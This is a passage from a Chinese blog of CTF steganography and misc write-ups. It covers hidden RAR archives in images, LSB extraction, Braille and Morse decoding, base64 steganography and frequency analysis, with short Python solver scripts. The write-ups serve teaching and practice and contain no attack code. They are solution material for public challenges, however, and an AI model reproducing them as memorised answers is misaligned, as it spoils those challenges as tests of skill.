class="headerlink" title="谁赢了比赛？"></a>谁赢了比赛？</h3><p>发现一个rar。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;who_won_the_game.png&#39; </span><br><span class="line">[?] 187692 bytes of extra data after image end (IEND), offset &#x3D; 0x15d2dc</span><br><span class="line">extradata:0         .. file: RAR archive data, v4, os: Win32</span><br><span class="line">    00000000: 52 61 72 21 1a 07 00 cf  90 73 00 00 0d 00 00 00  |Rar!.....s......|</span><br><span class="line">    00000010: 00 00 00 00 95 d3 74 44  94 35 00 90 dc 02 00 de  |......tD.5......|</span><br><span class="line">    00000020: 3c 03 00 02 46 d1 ab e2  bd 6a 13 47 1d 33 08 00  |&lt;...F....j.G.3..|</span><br><span class="line">    00000030: 20 00 00 00 68 65 68 65  2e 67 69 66 00 04 f8 fe  | ...hehe.gif....|</span><br><span class="line">    00000040: 42 6c d0 8d 00 b0 74 6c  37 34 b2 f5 0e 79 c4 24  |Bl....tl74...y.$|</span><br><span class="line">    00000050: 44 d5 0c 9d ba eb 18 46  c1 5d 76 a2 36 18 a2 cf  |D......F.]v.6...|</span><br><span class="line">    00000060: 38 6a 95 46 83 30 71 d7  67 36 ac 72 31 e3 b9 92  |8j.F.0q.g6.r1...|</span><br><span class="line">    00000070: b5 2f c7 b9 55 a9 59 ed  54 a8 23 d6 80 2a 42 ff  |.&#x2F;..U.Y.T.#..*B.|</span><br><span class="line">    00000080: 18 04 c2 f4 ba 07 9e 81  5e a3 4f 87 0c f1 50 47  |........^.O...PG|</span><br><span class="line">    00000090: 3d e9 c8 7d 35 bb a0 63  32 38 20 9a 38 c9 72 aa  |&#x3D;..&#125;5..c28 .8.r.|</span><br><span class="line">    000000a0: 9e 11 56 90 86 73 45 c5  50 51 0f 6a 67 80 9d 47  |..V..sE.PQ.jg..G|</span><br><span class="line">    000000b0: 28 05 51 20 25 33 bf ba  a2 0e 02 a8 a0 2d 43 fa  |(.Q %3.......-C.|</span><br><span class="line">    000000c0: 4b 8d 1a bb fd 33 4b 83  2d aa 14 0b 9c 32 34 ef  |K....3K.-....24.|</span><br><span class="line">    000000d0: 3f f5 46 75 00 61 44 b5  77 cc d9 e9 7e 36 ee da  |?.Fu.aD.w...~6..|</span><br><span class="line">    000000e0: 54 3d d0 20 e5 a1 75 57  3f 47 a6 d5 b3 60 8e 4b  |T&#x3D;. ..uW?G...&#96;.K|</span><br><span class="line">    000000f0: 38 6f 6a 1e 14 bc a0 f6  bb 7b 46 5e 90 49 36 d6  |8oj......&#123;F^.I6.|</span><br><span class="line">imagedata           .. text: &quot;888999999&quot;</span><br></pre></td></tr></table></figure><p>压缩包爆破拿到密码。</p><p>一个gif。分帧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# convert &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;hehe.gif&#39;  flag.png</span><br></pre></td></tr></table></figure><p>其中有一个png文件。写有where flag？</p><p>对其进行分析。在red 0通道发现二维码扫描，拿到flag。<code>使用zsteg</code>发现不了二维码。</p><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p>使用<code>zsteg</code>，发现red 0有猫腻，直接data extract提取数据，发现是个png，二维码。保存修改高度，扫码。</p><p>rbg0、msb、bgr通道。用stegsolve进行颜色对换后得到一张正常的二维码，扫描后下载百度网盘的文件：flag.rar。</p><p>flag.txt内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag不在这里哦  你猜猜flag在哪里呢？  找找看吧</span><br></pre></td></tr></table></figure><p>ntf隐写，使用rar解压，ntfs工具。拿到一个pyc文件，反编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;tools&#x2F;python-uncompyle6-master&#x2F;bin&#x2F;uncompyle6 &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;4.pyc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode():</span><br><span class="line">    flag &#x3D; &#39;*************&#39;</span><br><span class="line">    ciphertext &#x3D; []</span><br><span class="line">    for i in range(len(flag)):</span><br><span class="line">        s &#x3D; chr(i ^ ord(flag[i]))</span><br><span class="line">        if i % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            s &#x3D; ord(s) + 10</span><br><span class="line">        else:</span><br><span class="line">            s &#x3D; ord(s) - 10</span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line"></span><br><span class="line">    return ciphertext[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext &#x3D; [</span><br><span class="line"> &#39;96&#39;, &#39;65&#39;, &#39;93&#39;, &#39;123&#39;, &#39;91&#39;, &#39;97&#39;, &#39;22&#39;, &#39;93&#39;, &#39;70&#39;, &#39;102&#39;, &#39;94&#39;, &#39;132&#39;, &#39;46&#39;, &#39;112&#39;, &#39;64&#39;, &#39;97&#39;, &#39;88&#39;, &#39;80&#39;, &#39;82&#39;, &#39;137&#39;, &#39;90&#39;, &#39;109&#39;, &#39;99&#39;, &#39;112&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写脚本，拿到flag。</p><h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>压缩包名字就是压缩密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">name &#x3D; &#39;hW1ES89jF&#39;</span><br><span class="line">while True:</span><br><span class="line">    fz &#x3D; zipfile.ZipFile(name + &#39;.zip&#39;, &#39;r&#39;)</span><br><span class="line">    fz.extractall(pwd&#x3D;bytes(name, &#39;utf-8&#39;))</span><br><span class="line">    name &#x3D; fz.filelist[0].filename[0:9]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h3><p>binwalk分析，拿到压缩包，爆破，解压一个txt大量的字符，尝试词频分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#Author: mochu7</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = open(<span class="string">&#x27;./flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.format(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"></span><br><span class="line">res = sorted(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = str(i[<span class="number">0</span>])</span><br><span class="line">print(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h3><p><code>stings CTF</code></p><h3 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h3><p>一个压缩包，01editor 选择 EBCDIC编码得到压缩包的密码。</p><p>福尔摩斯里面的跳舞的小人加密。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>一个压缩包有弱口令，爆破不出来，查看注释，莫斯密码，放入sublim。解码拿到密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. ----- ..-. --- .-. --</span><br></pre></td></tr></table></figure><p>一张png图片。lsb隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;cloacked-pixel-master# python .&#x2F;lsb.py extract &#39;&#x2F;root&#x2F;桌面&#x2F;cloacked-pixel-master&#x2F;女神.png&#39;  flag.txt 123456</span><br><span class="line">[+] Image size: 500x500 pixels.</span><br><span class="line">[+] Written extracted data to flag.txt.</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;./flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h3><p>只有大横杆和小横杆，猜测摩斯密码，解密拿到flag。</p><h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>一个txt，一串十六进制，开头是<code>526172211a</code>。rar文件头导入01，需要密码，爆破。</p><p>解压得到一张png图片，hex分析，没有IHDR，而是JFIF，且为<code>FF D9</code>结尾，篡改了文件头，将<code>89 50 4e 47</code>改为<code>ff d8 ff e0</code>。</p><h3 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h3><p>exif查看信息，盲文密码。解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : <span class="number">12.07</span></span><br><span class="line">File Name                       : attachment.jpg</span><br><span class="line">Directory                       : /home/steady/桌面/steady</span><br><span class="line">File Size                       : <span class="number">127</span> kB</span><br><span class="line">File Modification Date/Time     : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">05</span> <span class="number">11</span>:<span class="number">39</span>:<span class="number">24</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access Date/Time           : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">05</span> <span class="number">11</span>:<span class="number">40</span>:<span class="number">28</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change Date/Time     : <span class="number">2020</span>:<span class="number">11</span>:<span class="number">05</span> <span class="number">11</span>:<span class="number">40</span>:<span class="number">28</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Software                        : Adobe Photoshop CC <span class="number">2018</span> (Windows)</span><br><span class="line">Artist                          : <span class="number">52</span>HeRtz</span><br><span class="line">XP Comment                      : ⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</span><br><span class="line">Padding                         : (Binary data <span class="number">1910</span> bytes, use -b option to extract)</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core <span class="number">5.6</span>-c142 <span class="number">79.160924</span>, <span class="number">2017</span>/<span class="number">07</span>/<span class="number">13</span><span class="number">-01</span>:<span class="number">06</span>:<span class="number">39</span></span><br><span class="line">Authors Position                : <span class="number">52</span>HeRtz</span><br><span class="line">Creator Tool                    : Adobe Photoshop CC <span class="number">2018</span> (Windows)</span><br><span class="line">Creator                         : <span class="number">52</span>HeRtz</span><br><span class="line">Current IPTC Digest             : <span class="number">2</span>adef26c2475bb7c4db0fe45a2cbd2bd</span><br><span class="line">Coded Character Set             : UTF8</span><br><span class="line">Application Record Version      : <span class="number">4</span></span><br><span class="line">Object Name                     : Congratulations！</span><br><span class="line">By-line                         : <span class="number">52</span>HeRtz</span><br><span class="line">By-line Title                   : <span class="number">52</span>HeRtz</span><br><span class="line">IPTC Digest                     : <span class="number">2</span>adef26c2475bb7c4db0fe45a2cbd2bd</span><br><span class="line">Image Width                     : <span class="number">482</span></span><br><span class="line">Image Height                    : <span class="number">482</span></span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : <span class="number">8</span></span><br><span class="line">Color Components                : <span class="number">3</span></span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:<span class="number">4</span>:<span class="number">4</span> (<span class="number">1</span> <span class="number">1</span>)</span><br><span class="line">Image Size                      : <span class="number">482</span>x482</span><br><span class="line">Megapixels                      : <span class="number">0.232</span></span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h3><p>压缩包不能打开，修改头部，打开之后，打开之后<code>document.XML</code>发现音符，解码拿到flag。</p><h3 id="看网课"><a href="#看网课" class="headerlink" title="看网课"></a>看网课</h3><p>视频分帧，拿到敲击码。</p><p>以<code>/</code>为分割。先行，后列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;</span><br><span class="line">  5,3     3,1    3,1    3,2</span><br><span class="line">   W       L      L      M</span><br></pre></td></tr></table></figure><p>在第<code>7.36s</code>发现第二段信息：<code>dXBfdXBfdXA=</code>。</p><p>使用这个密码解压<code>flag2.zip</code>，解压得到<code>Real flag,jpg</code>，使用<code>010 Ediotr</code>打开搜索关键词<code>ctf</code>即可得到flag。</p><h3 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目：低个头</span><br><span class="line"></span><br><span class="line">描述：EWAZX RTY TGB IJN IO KL 请破解该密文 f</span><br><span class="line"></span><br><span class="line">lag格式：XXX 明文</span><br><span class="line"></span><br><span class="line">提交：直接提交明文（大写）</span><br></pre></td></tr></table></figure><p>键盘密码。</p><h3 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h3><p>运行exe，拿到flag。</p><h3 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h3><p>binwalk分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ binwalk /home/steady/桌面/steady/flag.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0</span>             <span class="number">0x0</span>             JPEG image data, JFIF standard <span class="number">1.01</span></span><br><span class="line"><span class="number">37475</span>         <span class="number">0x9263</span>          JPEG image data, JFIF standard <span class="number">1.01</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 1.jpg</span><br></pre></td></tr></table></figure><p>发现一串字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</span><br></pre></td></tr></table></figure><p>base32解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">print base64.b32encode(&quot;hello world&quot;)</span><br><span class="line">print base64.b32decode(&quot;MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2&#x3D;&#x3D;&#x3D;&quot;)</span><br></pre></td></tr></table></figure><p>base32解密一定要注意后面=的个数。</p><h3 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line">50pt</span><br><span class="line"></span><br><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line"></span><br><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><p>长度为<code>134</code>的字符串，按每两位截取的十六进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#39;d4&#39;, &#39;e8&#39;, &#39;e1&#39;, &#39;f4&#39;, &#39;a0&#39;, &#39;f7&#39;, &#39;e1&#39;, &#39;f3&#39;, &#39;a0&#39;, &#39;e6&#39;, &#39;e1&#39;, &#39;f3&#39;, &#39;f4&#39;, &#39;a1&#39;, &#39;a0&#39;, &#39;d4&#39;, &#39;e8&#39;, &#39;e5&#39;, &#39;a0&#39;, &#39;e6&#39;, &#39;ec&#39;, &#39;e1&#39;, &#39;e7&#39;, &#39;a0&#39;, &#39;e9&#39;, &#39;f3&#39;, &#39;ba&#39;, &#39;a0&#39;, &#39;c4&#39;, &#39;c4&#39;, &#39;c3&#39;, &#39;d4&#39;, &#39;c6&#39;, &#39;fb&#39;, &#39;b9&#39;, &#39;b2&#39;, &#39;b2&#39;, &#39;e1&#39;, &#39;e2&#39;, &#39;b9&#39;, &#39;b9&#39;, &#39;b7&#39;, &#39;b4&#39;, &#39;e1&#39;, &#39;b4&#39;, &#39;b7&#39;, &#39;e3&#39;, &#39;e4&#39;, &#39;b3&#39;, &#39;b2&#39;, &#39;b2&#39;, &#39;e3&#39;, &#39;e6&#39;, &#39;b4&#39;, &#39;b3&#39;, &#39;e2&#39;, &#39;b5&#39;, &#39;b0&#39;, &#39;b6&#39;, &#39;b1&#39;, &#39;b0&#39;, &#39;e6&#39;, &#39;e1&#39;, &#39;e5&#39;, &#39;e1&#39;, &#39;b5&#39;, &#39;fd&#39;]</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>转换为10进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[212, 232, 225, 244, 160, 247, 225, 243, 160, 230, 225, 243, 244, 161, 160, 212, 232, 229, 160, 230, 236, 225, 231, 160, 233, 243, 186, 160, 196, 196, 195, 212, 198, 251, 185, 178, 178, 225, 226, 185, 185, 183, 180, 225, 180, 183, 227, 228, 179, 178, 178, 227, 230, 180, 179, 226, 181, 176, 182, 177, 176, 230, 225, 229, 225, 181, 253]</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>可以发现都是大于128的数，把所有数-128得到ASCII码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 